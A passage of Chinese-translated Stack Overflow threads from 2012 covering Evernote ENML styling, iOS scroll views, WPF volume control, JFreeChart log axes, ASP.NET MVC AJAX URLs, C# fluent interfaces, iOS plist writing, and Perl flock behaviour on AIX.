MessageBox.Show("BatteryChargeStatus : " & powerstatus.BatteryChargeStatus)

' Gets the reported full charge lifetime of the primary battery power source in seconds.
MessageBox.Show("BatteryFullLifetime : " & powerstatus.BatteryFullLifetime)

' Gets the approximate amount of full battery charge remaining.
MessageBox.Show("BatteryLifePercent : " & powerstatus.BatteryLifePercent)

' Gets the approximate number of seconds of battery time remaining.
MessageBox.Show("BatteryLifeRemaining : " & powerstatus.BatteryLifeRemaining)

' Gets the current system power status.
MessageBox.Show("PowerLineStatus : " & powerstatus.PowerLineStatus) 
```

# xml - 如何在 ENML 中将图像作为背景？

> ID：10347660
> 
> 赞同：0
> 
> 时间：2012-04-27T08:52:41.237
> 
> 标签：xml, evernote

可能这个问题听起来很愚蠢，但我已经搜索，阅读了很多并没有找到答案。

我知道如何放置图像：

```
<en-media hash="0410523c69dcc74bc103fd5cc638b410" 
```

`style="cursor: default;" type="image/jpeg" />`

但是是否可以将图像设置为可以重复的背景？如何？

我想自定义 Evernote 笔记。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-03T03:30:38.743

Evernote Windows 版在内部使用 WebKit 来显示笔记。虽然 Evernote 故意切断了一些 HTML 功能，但它们并没有全部丢失。具体来说，内联 CSS 被他们完好无损地保留了下来。

因此，知道`en-note`标签映射到`body`HTML 标签的人可以使用内联 CSS 来操作便笺背景。例如，这里是如何为笔记设置背景颜色：

1.  导出它
2.  添加 backround-color CSS 属性以注释内联 CSS： `<en-note style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space; background-color:#6495ed;">`

3.  导入它

一个更坚持不懈的人可能会进入`background-image`财产：`<en-note style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space; background-image:url('http://<an url to an image on a webserver somewere>');">`

你必须在互联网的某个地方有背景图像。无法在便笺本身中使用图像；CSS 对此一无所知`en-media`，Evernote 开发人员对此一无所知。

但猜猜怎么了？Evernote 用户已经拥有免费可靠的网络服务器 - Everenote 网络界面！

**在公共**笔记本中创建笔记。在便笺中粘贴背景图像。在 Evernote 网页界面中打开笔记，导航到笔记，复制图片 url 并在`background-image`. 你应该最终得到类似的东西：`<en-note style="word-wrap: break-word; -webkit-nbsp-mode: space; -webkit-line-break: after-white-space; background-image:url('https://www.evernote.com/shard/s41/res/f53f9eac-59de-4255-9ef0-4cab9f7f0c77/image_1334313119_841920.png')">`.

在 Windows 和 iPad 上测试 - 可以！

# ios - ios 滚动视图难题

> ID：10347671
> 
> 赞同：0
> 
> 时间：2012-04-27T08:53:26.290
> 
> 标签：ios, uiscrollview

我有一个滚动视图，它成功地填充了视图，但是它没有滚动，谁能看到为什么？

```
 CGRect fullScreenRect=[[UIScreen mainScreen] applicationFrame];

    UIScrollView *scrollView=[[UIScrollView alloc] initWithFrame:fullScreenRect];

    [scrollView setContentSize:self.view.frame.size];

    if (sqlite3_open(dbpath, &xxx) == SQLITE_OK)
    {
// code that works        
        if (sqlite3_prepare_v2(xxx, query_stmt, -1, &statement, NULL) == SQLITE_OK)
        {
            while (sqlite3_step(statement) == SQLITE_ROW)
            {
//more code that works                
                //add image view to view
                [scrollView addSubview:myImageView];

                i = i + 1;
            } 
            sqlite3_finalize(statement);
        }
        sqlite3_close(xxx);
    }

    self.view=scrollView; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:57:20.177

为了使滚动视图可滚动，您需要将其 contentSize 属性设置为能够包含您的所有内容（因此很可能大于滚动视图框架）。例如，如果您想水平滚动视图，则需要将 contentSize 宽度设置为图像视图数量的倍数：

```
...
// Loaded data and created subviews
// Now set contentSize
[scrollView setContentSize:CGSizeMake(imageWidth*numberOfImages, self.view.frame.size.height)]; 
```

# c# - 改变音量确实会移动滑块，但不会移动音频输出

> ID：10347672
> 
> 赞同：3
> 
> 时间：2012-04-27T08:53:41.720
> 
> 标签：c#, .net

我的表单中有一个滑块和一个 webbrowser 对象，滑动它应该会改变音量，但是它确实会移动滑块，如下所示：![滑块确实移动，但声音输出没有改变](../Images/c4e0fc64a87572f18624337ee0cd4fbd.png)

但它不会改变音量的实际输出。这可能是因为我集成了 WebBrowser 对象并使用 Windows 7。当我手动滑动滑块（在屏幕截图中看到的那个）时，音量输出**确实**发生了变化。播放 .wav 文件时，音量的输出**会**发生变化，但 WebBrowser 对象不会发生变化。

我正在使用以下代码：

Xaml

```
<Window x:Class="WpfApplication1.MainWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        Title="MainWindow" Height="350" Width="525">
    <Grid>
        <Slider Minimum="0" Maximum="10" ValueChanged="ValueChanged"/>
    </Grid>
</Window> 
```

C＃

```
public partial class MainWindow
{
    public MainWindow()
    {
        InitializeComponent();
    }

    private void ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
    {
        // Calculate the volume that's being set
        double newVolume = ushort.MaxValue * e.NewValue / 10.0;

        uint v = ((uint) newVolume) & 0xffff;
        uint vAll = v | (v << 16);

        // Set the volume
        int retVal = NativeMethods.WaveOutSetVolume(IntPtr.Zero, vAll);

        Debug.WriteLine(retVal);
    }
}

static class NativeMethods
{
    [DllImport("winmm.dll", EntryPoint = "waveOutSetVolume")]
    public static extern int WaveOutSetVolume(IntPtr hwo, uint dwVolume);

} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-01T16:58:16.257

尝试使用[MediaElement](http://msdn.microsoft.com/en-us/library/system.windows.controls.mediaelement.volume.aspx)。

然后你可以像这样播放你的广播电台：

```
<MediaElement LoadedBehavior="Manual" x:Name="media" />

media.Source = new Uri(@"http://shoutcastinfo.radiostaddenhaag.com/stad.wax");
media.Play(); 
```

并改变音量

```
<Slider Minimum="0" Maximum="1" ValueChanged="ValueChanged"/>

private void ValueChanged(object sender, RoutedPropertyChangedEventArgs<double> e)
{
    media.Volume = e.NewValue;
} 
```

Windows Mixer 和 WPF 滑块现在都可以适当地更改音量，但两者的值是独立的，不反映彼此的更改。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-06T17:32:31.320

首先这`uint v = ((uint)newVolume) & 0xffff`有点多余，`uint v = (uint)newVolume`会返回相同的结果。

其次，根据[waveOutSetVolume 方法的 MSDN 文档](http://msdn.microsoft.com/en-us/library/windows/desktop/dd743874.aspx)：

大多数设备不支持完整的 16 位音量级别控制，并且不会使用请求音量设置的最低有效位。例如，如果设备支持 4 位音量控制，则值 0x4000、0x4FFF 和 0x43BE 都将被截断为 0x4000。waveOutGetVolume 函数返回使用 waveOutSetVolume 设置的完整 16 位设置。

你尝试过大的改变吗？

# java - 对数轴标签/刻度自定义

> ID：10347674
> 
> 赞同：9
> 
> 时间：2012-04-27T08:54:01.350
> 
> 标签：java, jfreechart

我正在使用`JFreeChart`API 在我的 Java 应用程序中生成一些图表。在我的一个图表中，我尝试使用该`LogAxis`对象通过以下代码使我的 y 轴成为对数刻度轴（图中的 A）：

```
LogAxis logAxis = new LogAxis("Price($)");
logAxis.setMinorTickMarksVisible(true);
logAxis.setAutoRange(true);
xyplot.setRangeAxis(logAxis); 
```

![在此处输入图像描述](../Images/5858745d1aa9e91e2fbb679bd73188be.png)

然后我得到一个对数刻度的 y 轴，刻度为 10^n（如图 A）。我想让它像B一样，对用户来说更直观，每个区间代表不同的值，如图，2->4、4->8、8->16，区间增长为2^ n. 较小的一点是，即使它们代表不同的值，间隔也显示同样宽。但是，当 O 尝试通过以下代码实现此目的时：

```
LogAxis logAxis = new LogAxis("Price($)");
logAxis.setBase(2);
logAxis.setTickUnit(new NumberTickUnit(2));
logAxis.setMinorTickMarksVisible(true);
logAxis.setAutoRange(true);
xyplot.setRangeAxis(logAxis); 
```

我得到的是类似于图C的东西。

我怎样才能达到图B？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-27T09:45:58.473

我想你需要的是`logAxis.setNumberFormatOverride(NumberFormat format);`

编辑：由于需要进一步的帮助......试试这个：

```
logAxis.setBase(10);
LogFormat format = new LogFormat(logAxis.getBase(), "", "", true);
logAxis.setNumberFormatOverride(format); 
```

这是一个可以用来玩...的完整方法：

```
 public static void main(String[] args) {
    XYSeries series = new XYSeries("");
    series.add(1, 10);
    series.add(2, 100);
    series.add(3, 1000);
    series.add(4, 10000);
    series.add(5, 100000);
    series.add(6, 1000000);

//    NumberAxis yAxis = new NumberAxis("");
    LogAxis yAxis = new LogAxis("");
    yAxis.setBase(10);
    LogFormat format = new LogFormat(yAxis.getBase(), "", "", true);
    yAxis.setNumberFormatOverride(format);
    XYPlot plot = new XYPlot(
      new XYSeriesCollection(series),
      new NumberAxis(""),
      yAxis,
      new XYLineAndShapeRenderer(true, false));
    JFreeChart chart = new JFreeChart("", JFreeChart.DEFAULT_TITLE_FONT, plot, false);

    JFrame frame = new JFrame("LogAxis Test");
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    frame.setContentPane(new ChartPanel(chart));
    frame.pack();
    frame.setVisible(true);
  } 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-27T15:17:17.047

即使您使用的是`LogAxis`，您也可以指定整数刻度单位，如下面@amaidment 示例的变体所示。

![对数轴](../Images/f2a7b27726c81160e7de0e3eff5df430.png)

```
/** @see http://stackoverflow.com/a/10353270/230513 */
private static void createFrame() {
    XYSeries series = new XYSeries("Series");
    for (int i = 0; i <= N; i++) {
        series.add(i, Math.pow(2, i));
    }
    NumberAxis xAxis = new NumberAxis("X");
    xAxis.setStandardTickUnits(NumberAxis.createIntegerTickUnits());
    LogAxis yAxis = new LogAxis("Y");
    yAxis.setBase(2);
    yAxis.setStandardTickUnits(NumberAxis.createIntegerTickUnits());
    XYPlot plot = new XYPlot(new XYSeriesCollection(series),
        xAxis, yAxis, new XYLineAndShapeRenderer(true, false));
    JFreeChart chart = new JFreeChart(
        "Chart", JFreeChart.DEFAULT_TITLE_FONT, plot, false);
    JFrame frame = new JFrame("LogAxis Test");
    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
    frame.setContentPane(new ChartPanel(chart));
    frame.pack();
    frame.setVisible(true);
}

public static void main(String[] args) {
    EventQueue.invokeLater(new Runnable() {

        @Override
        public void run() {
            createFrame();
        }
    });
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-10-06T22:09:11.700

您应该使用`ChartFactory`来创建所需的图表类型，而不是`JFreeChart`直接创建构造函数。因此，这是一个比之前发布的更好的解决方案：

```
public class MyLogChart 
{
    public static void main(String[] args) 
    {
        XYSeries series = new XYSeries("First");
        series.add(1.0, 1.0);
        series.add(2.0, 10.0);
        series.add(3.0, 100.0);
        series.add(4.0, 1000.0);
        series.add(5.0, 10000.0);
        series.add(6.0, 100000.0);
        series.add(7.0, 1000000.0);
        series.add(8.0, 10000000.0);

        XYSeriesCollection dataset = new XYSeriesCollection();
        dataset.addSeries(series);

        JFreeChart chart = ChartFactory.createXYLineChart(
            "XY Chart",
            "x-axis",
            "y-axis",
            dataset,
            PlotOrientation.VERTICAL,
            false,
            false,
            false
            );

        LogarithmicAxis yAxis = new LogarithmicAxis("Y");

        XYPlot plot = chart.getXYPlot();
        plot.setRangeAxis(yAxis);

        XYLineAndShapeRenderer renderer = (XYLineAndShapeRenderer)plot.getRenderer();
        renderer.setSeriesShapesVisible(0, true);

        ChartFrame frame = new ChartFrame("My Chart", chart);
        frame.pack();
        frame.setVisible(true);
    }
} 
```

# asp.net-mvc-3 - 移动到 .js 文件时，Jquery ajax 会出错

> ID：10347677
> 
> 赞同：-1
> 
> 时间：2012-04-27T08:54:12.143
> 
> 标签：asp.net-mvc-3, jquery

在 asp.net MVC3 应用程序中，我有这个 jquery ajax 函数

```
function CheckValue() {
    var Returnvalue ="";
    $.ajax({
        type: 'POST',
        url: '@Url.Action("CheckValue", "Home")',
        async: false,
        success: function (Value) {
            Returnvalue= Value;
        },
        complete: function (IsValid) {
        },
        error: function (xhr, textStatus, errorThrown) {
            alert(errorThrown);
        }

    })
    return Returnvalue;
} 
```

它所做的是从 HomeController 调用一个名为 CheckValue() 的操作，该操作返回一个值。

当我在我的视图页面中有它时，它工作正常。但随后，我将其移至 .js 文件`MyFunctions.js`并将该文件包含在我的视图中

```
<script src="@Url.Content("~/Scripts/MyFunctions.js")" type="text/javascript"></script> 
```

并且 ajax 不再工作了。我收到“未找到”警报

对这个问题有任何想法吗？非常感谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:45:11.697

问题是由于您的代码现在在`.js`文件中，但它包含`C#`代码，特别是`@Url.Action("CheckValue", "Home")`. `.js`文件没有被编译或解释，因此你得到的错误。此外，您的代码的结构方式不正确。`success`由于 AJAX 调用是异步的，您需要在处理程序中返回值。

解决方法是将 url 作为函数的参数传递：

```
function CheckValue(url) {
    var Returnvalue ="";
    $.ajax({
        type: 'POST',
        url: url,
        async: false,
        success: function (Value) {
            return Value;
        },
        complete: function (IsValid) {
        },
        error: function (xhr, textStatus, errorThrown) {
            alert(errorThrown);
        }    
    })
} 
```

然后在您的页面中，您可以将 C# 变量传递给 javascript 函数：

```
<script src="@Url.Content("~/Scripts/MyFunctions.js")" type="text/javascript"></script>
<script type="text/javascript">
    CheckValue('@Url.Action("CheckValue", "Home")');
</script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T12:04:47.077

注入 MVC 控制器 url 的更好方法是通过服务器端呈现的设置 JS

```
@{
    Layout = null;
    Response.Expires = 120;
    Response.CacheControl = "public";
    Response.ContentType = "text/javascript";
}

MyApp = {};
MyApp.settings = {
    checkValueUrl: "@Url.Action("CheckValue", "Home")"
}; 
```

# c# - 创建用于将元素添加到列表的流畅界面

> ID：10347678
> 
> 赞同：5
> 
> 时间：2012-04-27T08:54:13.137
> 
> 标签：c#, .net, fluent-interface

这就是我想要实现的目标：

```
config.Name("Foo")
      .Elements(() => {
                         Element.Name("element1").Height(23);
                         Element.Name("element2").Height(31);
                      })
     .Foo(23); 
```

或像这样：

```
 .Elements(e => {
                     e.Name("element1").Height(23);
                     e.Name("element2").Height(31);
                  })
  .Foo(3232); 
```

这就是我目前所拥有的：

```
public class Config
{
   private string name;
   private int foo;
   private IList<Element> elements = new List<Element>();

   public Config Name(string name)
   {
      this.name = name;
      return this;
   }

   public Config Foo(int x)
   {
       this.foo = x;
   }

   ... //add method for adding elements 

   class Element
   {
      public string Name { get; set; }
      public int Height { get; set; }
   }
} 
```

有人知道该怎么做吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-27T09:02:05.620

```
public class Config
{
   private string name;
   private IList<Element> elements = new List<Element>();
   public IList<Element> GetElements {get {return this.elements;}}
   public Config Name(string name)
   {
      this.name = name;
      return this;
   }

   public Config Elements(IEnumerable<Element> list)
   {
        foreach ( var element in list)
            elements.Add(element);
        return this;
   }

   public Config Elements(params Element[] list)
   {
        foreach ( var element in list)
            elements.Add(element);
        return this;
   }

   public Config Elements(params Expression<Func<Element>>[] funcs)
   {
        foreach (var func in funcs )
            elements.Add(func.Compile()());
        return this;
   }

   public Config Elements(params Expression<Func<IEnumerable<Element>>>[] funcs)
   {
        foreach (var func in funcs )
            foreach ( var element in func.Compile()())
                elements.Add(element);
        return this;
   }

   public class Element
   {
      public string Name { get; set; }
      public int Height { get; set; }     
      public Element() {}
      public Element(string name)
      {
         this.Name = name;
      }  
      public Element AddHeight(int height)
      {
          this.Height = height;
          return this;
      }
      public static Element AddName(string name)
      {
        return new Element(name);
      }
   }
} 
```

用法

```
var cfg = new Config()
    .Name("X")
    .Elements(new [] { new Config.Element { Name = "", Height = 0} })
    .Elements(
            Config.Element.AddName("1").AddHeight(1), 
            Config.Element.AddName("2").AddHeight(2) 
            )
    .Elements(
        () => Config.Element.AddName("1").AddHeight(1)
    )
    .Elements(
        () => new[] {
                Config.Element.AddName("1").AddHeight(1),
                Config.Element.AddName("1").AddHeight(1)
               }
    ) 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-05T19:50:19.907

这是一个*完全*按照您的第二个代码示例工作的版本。虽然它真的很丑 - 我绝对不想自己使用它。注释在最后。

```
using System;
using System.Collections.Generic;

public class Config
{
    private string name;
    private int foo;
    private IList<Element> elements = new List<Element>();

    public Config Name(string name)
    {
        this.name = name;
        return this;
    }

    public Config Foo(int x)
    {
        this.foo = x;
        return this;
    }

    public Config Elements(Action<ElementBuilder> builderAction)
    {
        ElementBuilder builder = new ElementBuilder(this);
        builderAction(builder);
        return this;
    }

    public class ElementBuilder
    {
        private readonly Config config;

        internal ElementBuilder(Config config)
        {
            this.config = config;
        }

        public ElementHeightBuilder Name(string name)
        {
            Element element = new Element { Name = name };
            config.elements.Add(element);
            return new ElementHeightBuilder(element);
        }
    }

    public class ElementHeightBuilder
    {
        private readonly Element element;

        internal ElementHeightBuilder(Element element)
        {
            this.element = element;
        }

        public void Height(int height)
        {
            element.Height = height;
        }
    }

    public class Element
    {
        public string Name { get; set; }
        public int Height { get; set; }
    }
}

class Test
{
    static void Main()
    {
        Config config = new Config();

        config.Name("Foo")
            .Elements(e => {
                e.Name("element1").Height(23);
                e.Name("element2").Height(31);
            })
            .Foo(3232);
    }
} 
```

笔记：

使用此代码，您*必须*先调用`Name`，然后可以选择调用`Height`每个元素 - 尽管如果您调用`Height`. 如果您将`Elements`呼叫更改为：

```
 .Elements(e => {
                     e.NewElement().Name("element1").Height(23);
                     e.NewElement().Name("element2").Height(31);
                 }) 
```

或这个：

```
 .Elements(e => {
                     e.Name("element1").Height(23).AddToConfig();
                     e.Name("element2").Height(31).AddToConfig();
                 }) 
```

那么你最终会得到一个更灵活的情况；你可以有一个`ElementBuilder`班级来做正确的事。这个的第一个版本是更好的 IMO。

所有这些仍然*远*不如我的另一个答案中显示的简单有效的对象/集合初始化程序那么令人愉快，我强烈建议您使用它。我对这种方法真的没有任何好处——如果你没有在 Telerik API 中看到过，你自然会想要这个吗？从其他评论看来，您似乎被使用 lambda 表达式的“闪亮”所吸引……不要。它们在正确的环境中很棒，但在我看来，如果没有它们，有*更*清洁的方法可以实现这一目标。

我建议您退后一步，弄清楚您是否*真的*从您最初想要使用的语法中获得了任何东西，并考虑您是否更愿意维护此答案中的代码类型，或者对象/集合初始化程序中的代码解决方案。

编辑：这是我对 Zoltar 建议的解释，它消除了对额外课程的需要：

```
using System;
using System.Collections.Generic;

public class Config
{
    private string name;
    private int foo;
    private IList<Element> elements = new List<Element>();

    public Config Name(string name)
    {
        this.name = name;
        return this;
    }

    public Config Foo(int x)
    {
        this.foo = x;
        return this;
    }

    public Config Elements(Action<ElementBuilder> builderAction)
    {
        ElementBuilder builder = new ElementBuilder(this);
        builderAction(builder);
        return this;
    }

    public class ElementBuilder
    {
        private readonly Config config;
        private readonly Element element;

        // Constructor called from Elements...
        internal ElementBuilder(Config config)
        {
            this.config = config;
            this.element = null;
        }

        // Constructor called from each method below
        internal ElementBuilder(Element element)
        {
            this.config = null;
            this.element = element;
        }

        public ElementBuilder Name(string name)
        {
            return Mutate(e => e.Name = name);
        }

        public ElementBuilder Height(int height)
        {
            return Mutate(e => e.Height = height);
        }

        // Convenience method to avoid repeating the logic for each
        // property-setting method
        private ElementBuilder Mutate(Action<Element> mutation)
        {
            // First mutation call: create a new element, return
            // a new builder containing it.
            if (element == null)
            {
                Element newElement = new Element();
                config.elements.Add(newElement);
                mutation(newElement);
                return new ElementBuilder(newElement);
            }
            // Subsequent mutation: just mutate the element, return
            // the existing builder
            mutation(element);
            return this;
        }
    }

    public class Element
    {
        public string Name { get; set; }
        public int Height { get; set; }
    }
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-27T09:43:42.863

我宁愿使用以下流畅的界面：

```
Config config = new Config("Foo")
                        .WithElement("element1", 23)
                        .WithElement("element2"); 
```

我认为它更具可读性和紧凑性。执行：

```
public class Config
{
    private string name;
    private IList<Element> elements = new List<Element>();

    public Config(string name)
    {
        this.name = name;
    }

    public Config WithElement(string name, int height = 0)
    {
        elements.Add(new Element() { Name = name, Height = height });
        return this;
    }

    class Element
    {
        public string Name { get; set; }
        public int Height { get; set; }
    }
} 
```

如果 name 是可选的，则添加不带参数的 Config 构造函数。如果您不需要高度和名称，还可以考虑 WithElemnt 方法的可选参数。

更新：我将高度更改为可选参数，以显示如何添加仅指定名称的元素。

更新（如果您只想允许一组元素）

```
Config config = new List<Element>()
                    .AddElement(new Element {Name = "element1", Height = 23 })
                    .AddElement(new Element {Name = "element2" })
                    .WrapToConfig()
                    .Name("config1"); 
```

执行：

```
public static class ConfigurationHelper
{
    public static IList<Element> AddElement(this IList<Element> elements, Element element)
    {
        elements.Add(element);
        return elements;
    }

    public static Config WrapToConfig(this IList<Element> elements)
    {
        return Config(elements);
    }
} 
```

但这对用户来说不是很明显，所以我会使用第一个简单流畅的界面。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-05-01T06:22:09.513

您不想使用对象和集合初始化器的任何原因？

```
public class Config
{
   public string Name { get; set; }
   public int Foo { get; set; }
   public IList<Element> Elements { get; private set; }

   public Config()
   {
       Elements = new List<Element>();
   }
}

// I'm assuming an element *always* needs a name and a height
class Element
{
   public string Name { get; private set; }
   public int Height { get; private set; }

   public Element(string name, int height)
   {
       this.Name = name;
       this.Height = height;
   }
} 
```

然后：

```
var config = new Config
{
    Name = "Foo",
    Elements = { 
        new Element("element1", 23),
        new Element("element2", 31)
    },
    Foo = 23
}; 
```

如果您不想直接公开元素列表，您可以随时将其转换为构建器，并将其复制到更私有的数据结构中`Build`：

```
var config = new Config.Builder
{
    Name = "Foo",
    Elements = { 
        new Element("element1", 23),
        new Element("element2", 31)
    },
    Foo = 23
}.Build(); 
```

这具有额外的优势，您可以使`Config`自己不可变。

如果您总是需要`Name`在场，只需将其作为构造函数参数即可。

虽然有时拥有一个带有变异（或复制和更改）方法调用的流畅接口是件好事，但在这种情况下，我认为集合/对象初始值设定项更符合 C# 的习惯。

请注意，如果您使用 C# 4 并且想要`Element`调用构造函数，则始终可以使用命名参数：

```
new Element(name: "element2", height: 31) 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-04-30T14:06:26.173

使用数据构建器模式。这样做的好处是它将流畅的构建 api 与数据对象分开。当然，您可以在约定中省略“with”。

用法：

```
var aConfig = new ConfigBuilder();

// create config fluently with lambdas
Config config = aConfig.WithName("Foo")
        .WithElement(e => e.WithName("element1").WithHeight(23))
        .WithElement(e => e.WithName("element2").WithHeight(31))
    .WithFoo(3232)
    .Build();

// create elements in one go
config = aConfig.WithName("Foo")
         .WithElements(
             e => e.WithName("element1").WithHeight(23), 
             e => e.WithName("element2").WithHeight(31))
     .WithFoo(3232)
     .Build();

var anElement = new ElementBuilder();

// or with builders 
config = aConfig.WithName("Foo")
        .WithElement(anElement.WithName("element1").WithHeight(23))
        .WithElement(anElement.WithName("element2").WithHeight(31))
    .WithFoo(3232)
    .Build();

// use builders to reuse configuration code
anElement.WithHeigh(100);

config = aConfig.WithName("Bar")
        .WithElement(anElement.WithName("sameheight1"))
        .WithElement(anElement.WithName("sameheight2"))
    .WithFoo(5544)
    .Build(); 
```

执行：

```
public class ConfigBuilder
{
    private string name;
    private int foo;
    private List<Element> elements = new List<Element>();

    public ConfigBuilder WithName(string name)
    {
         this.name = name;
         return this;
    }

    public ConfigBuilder WithFoo(int foo)
    {
        this.foo = foo;
        return this;
    }

    public ConfigBuilder WithElement(Element element)
    {
        elements.Add(element);
        return this;
    }

    public ConfigBuilder WithElement(ElementBuilder element)
    {
        return WithElement(element.Build());
    }

    public ConfigBuilder WithElement(Action<ElementBuilder> builderConfig)
    {
         var elementBuilder = new ElementBuilder();
         builderConfig(elementBuilder);
         return this.WithElement(elementBuilder);
    }

    public ConfigBuilder WithElements(params Action<ElementBuilder>[] builderConfigs)
    {
         foreach(var config in builderConfigs)
         {
              this.WithElement(config);
         }

         return this;
    }

    public Config Build()
    {
         return new Config() 
         { 
             Name = this.name,
             Foo = this.foo,
             Elements = this.elements
         };
    }
}

public class ElementBuilder
{
    private string name;
    private int height;

    public ElementBuilder WithName(string name)
    {
        this.name = name;
        return this;
    }

    public ElementBuilder WithHeight(int height)
    {
        this.height = height;
        return this;
    }

    public Element Build()
    {
        return new Element() 
        { 
            Name = this.name,
            Height = this.height
        };
    }
}

public class Config
{
    public string Name { get; set; }
    public int Foo { get; set; }
    public IList<Element> Elements { get; set; }
}

public class Element
{
    public string Name { get; set; }
    public int Height { get; set; }
} 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-05-03T21:48:29.113

这是放置在 Config 中的**方法 1——** “一次一个”：

```
public Config Element(Action<Element> a) {
    Element e = new Element();
    a(e);
    this.elements.Add(e);
    return this;
} 
```

以下是如何使用它：

```
config.Name("Foo")
    .Element(e => e.Name("element1").Height(23))
    .Element(e => e.Name("element2").Height(31))
    .Foo(3232); 
```

这是**方法2** - “列表”：

```
public Config Elements(Func<List<Element>> a) {
    List<Element> elements = a();
    foreach (Element e in elements) {
        this.elements.Add(e);
    }
    return this;
} 
```

以下是如何使用它：

```
config.Name("Foo")
    .Elements(() => new List<Element>() {
            new Element().Name("element1").Height(23),
            new Element().Name("element2").Height(31)
        })
    .Foo(3232); 
```

请注意，它假定 Element 没有嵌套在 Config 中（或者您`new Config.Element()`在示例 2 中需要）。

**请注意**，在您的“列表”示例中，您传入了一个 Element 对象，但您尝试设置它两次。第二行将更改元素，而不是创建新元素。：

```
.Elements(e => {
                 e.Name("element1").Height(23); // <-- You set it
                 e.Name("element2").Height(31); // <-- You change it
              })
.Foo(3232); 
```

因此这种语法不起作用。

**这个怎么运作：**

`Func<T,U,...>`是一个匿名函数委托，它接受除一个以外的所有参数，并返回最后一个。 `Action<T,U,...>`是一个匿名函数委托，它接受所有参数。例如：

`Func<int,string> f = i => i.ToString();`说“接受一个 int，返回一个字符串”。

`Action<int> f = i => string c = i.ToString();`说“接受一个 int，什么都不返回”。

# objective-c - .plist 文件写入失败！这段代码有什么问题？

> ID：10347680
> 
> 赞同：0
> 
> 时间：2012-04-27T08:54:15.390
> 
> 标签：objective-c, ios, cocoa, plist, nsmutabledictionary

在此代码之后，我的 plist 文件中没有写入任何内容。我的代码有什么问题？

```
NSString *path = [[NSBundle mainBundle] bundlePath];
NSString *finalPath = [path stringByAppendingPathComponent:@"aFile.plist"];
NSMutableDictionary *reqData = [NSMutableDictionary dictionaryWithContentsOfFile:finalPath];
/*
some modifications to "reqData"
*/
[reqData writeToFile:finalPath atomically:YES]; 
```

文件中没有写入任何内容。可能是什么问题呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T09:05:00.843

你最好写到 Document 文件夹：

```
NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                     NSUserDomainMask,
                                                     YES);
NSString *path = [paths objectAtIndex:0]; 
```

**更新**

根据[NSDictionary 类参考](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/nsdictionary_Class/Reference/Reference.html#//apple_ref/occ/instm/NSDictionary/writeToFile%3aatomically%3a)：

> 此方法在写出文件之前递归地验证所有包含的对象是属性列表对象（NSData、NSDate、NSNumber、NSString、NSArray 或 NSDictionary 的实例），如果所有对象都不是属性列表对象，则返回 NO，因为结果文件不是有效的属性列表。

在您的整个字典中，是否还有其他类型的对象不是这些有效对象？

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T08:56:29.580

您正在尝试将文件写回应用程序包。

这就是最有可能导致错误的原因。

如果您尝试将其写入其他地方（例如，在您的桌面文件夹中）怎么办？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T16:21:58.303

如果您在应用程序中包含 plist，您需要在应用程序首次启动时直接将该文件复制到 Documents 中（如果尚未复制到那里）。然后，您要对 plist 执行的任何读写操作都应从 Documents 目录中的副本而不是应用程序包中的版本中完成。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T16:49:37.413

首先要记住：

您可以从资源中读取 plist 文件，但不能修改它。

如果你想修改，

1.  将该文件复制到 Documents 目录
2.  根据类型将 plist 的内容复制到数组或字典中
3.  做出你想要的改变
4.  最后....将其保存回文档目录

做的伎俩

# perl - Perl：flock() 在 Linux 上工作，忽略 AIX 上的先前锁定

> ID：10347683
> 
> 赞同：3
> 
> 时间：2012-04-27T08:54:36.037
> 
> 标签：perl, aix, file-locking, flock

简而言之：使用flock() 编写了一个Perl 脚本。在 Linux 上，它的行为符合预期。在 AIX 上，flock() 始终返回 1，即使脚本的另一个实例使用 flock() 应该持有锁定文件的排他锁。

我们发布了一个 Bash 脚本来重新启动我们的程序，依靠 flock(1) 来防止同时重新启动产生多个进程。最近我们部署在 AIX 上，默认情况下，flock(1) 不会出现，管理员也不会提供。为了简单起见，我写了一个 Perl 脚本，叫做flock，像这样：

```
#!/usr/bin/perl

use Fcntl ':flock';
use Getopt::Std 'getopts';

getopts("nu:x:");

%switches = (LOCK_EX => $opt_x, LOCK_UN => $opt_u, LOCK_NB => $opt_n);

my $lockFlags = 0;

foreach $key (keys %switches) {
    if($switches{$key}) {$lockFlags |= eval($key)};
}

$fileDesc = $opt_x || $opt_u;

open(my $lockFile, ">&=$fileDesc") ||  die "Can't open file descriptor: $!";
flock($lockFile, $lockFlags) || die "Can't change lock - $!\n";; 
```

我通过从两个终端选项卡几乎同时运行两次 (flock -n -x 200; sleep 60)200>lockfile 来测试脚本。

在 Linux 上，如预期的那样，第二次运行因“资源暂时不可用”而终止。

在 AIX 上，第二次运行获得锁，flock() 返回 1，这绝对不是预期的。

